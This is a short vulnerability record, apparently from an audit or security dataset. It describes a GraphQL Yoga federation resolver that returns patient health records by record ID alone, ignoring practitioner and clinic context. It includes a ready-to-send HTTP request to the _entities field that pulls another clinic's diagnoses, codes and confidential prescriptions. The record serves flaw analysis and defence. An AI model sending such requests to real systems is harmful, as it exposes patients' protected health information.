diagnosis: The GraphQL Yoga entity resolver for PatientHealthRecord resolves patient EHR documents using only the ehrRecordId key from the federated representation. It completely ignores the practitioner and clinicId present in context, enabling any medical staff member or external client with federated query access to view protected health information (PHI) and confidential diagnoses of patients from other clinics.
exploit_request:
POST /graphql HTTP/1.1
Host: ehr-subgraph.hospital.internal:4004
Content-Type: application/json
X-Practitioner-Id: doc_external_22
X-Clinic-Id: clinic_east_01

{"query": "query { _entities(representations: [{ __typename: \"PatientHealthRecord\", ehrRecordId: \"ehr_vip_99214\" }]) { ... on PatientHealthRecord { patientMrn diagnosisNotes icd10Codes confidentialPrescriptions } } }"}
